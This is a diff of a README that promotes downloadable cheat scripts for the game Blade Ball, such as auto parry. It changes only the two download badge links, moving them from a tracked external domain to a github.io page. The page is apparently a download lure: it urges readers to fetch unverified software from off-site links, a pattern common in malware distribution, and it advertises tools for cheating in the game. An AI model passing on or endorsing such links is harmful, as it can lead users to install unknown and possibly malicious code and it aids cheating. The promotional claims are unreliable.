@@ -2,7 +2,7 @@
 
 These Blade Ball scripts are designed to enhance your gameplay with various automated features, making it easier to dominate your matches. Whether you're looking for automatic parries or other useful in-game actions, these scripts have you covered.
 
-[![Download BladeBall Scripts](https://img.shields.io/badge/Download-BladeBall%20Scripts-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download BladeBall Scripts](https://img.shields.io/badge/Download-BladeBall%20Scripts-blueviolet)](https://bladeball-scripts.github.io/.github/)
 
 ### Features:
 - ⚔️ **Auto Parry** – Automatically parry incoming attacks with precise timing.
@@ -19,4 +19,4 @@ These Blade Ball scripts are designed to enhance your gameplay with various auto
 
 Elevate your Blade Ball experience with these powerful scripts!
 
-[![Download BladeBall Scripts](https://img.shields.io/badge/Download-BladeBall%20Scripts-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download BladeBall Scripts](https://img.shields.io/badge/Download-BladeBall%20Scripts-blueviolet)](https://bladeball-scripts.github.io/.github/)
